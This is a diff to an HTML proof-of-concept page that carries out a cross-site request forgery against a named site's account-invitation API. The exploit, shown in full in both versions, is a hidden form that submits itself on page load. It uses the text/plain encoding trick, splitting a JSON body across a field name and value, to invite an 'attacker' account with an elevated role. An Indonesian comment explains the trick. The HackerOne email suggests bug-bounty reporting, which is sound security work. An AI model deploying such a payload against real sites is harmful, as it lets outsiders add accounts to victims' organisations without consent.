@@ -1,23 +1,17 @@
 <!DOCTYPE html>
 <html>
-<body>
-  <h1>CSRF PoC - Form text/plain</h1>
- <form id="csrfForm"
-      action="https://www.sellingpilot.com/api/account/inviting?_xhr=true"
-      method="POST"
-      enctype="text/plain">
-  <input type="hidden"
-         name='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us","foo":"'
-         value='bar"}'>
-</form>
-<script>
-  document.getElementById("csrfForm").submit();
-</script>
-<script>
-  document.getElementById("csrfForm").submit();
-</script>
-  <script>
-    document.getElementById('csrfForm').submit();
-  </script>
+<head>
+  <title>CSRF PoC - Invite Member</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+  <form action="https://www.sellingpilot.com/api/account/inviting?_xhr=true" method="POST" enctype="text/plain">
+
+    <!-- Trik: name dibuka dengan {"  dan value ditutup dengan "} -->
+    <input type="hidden"
+           name='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us","x":"'
+           value='"}'>
+  </form>
+
 </body>
 </html>
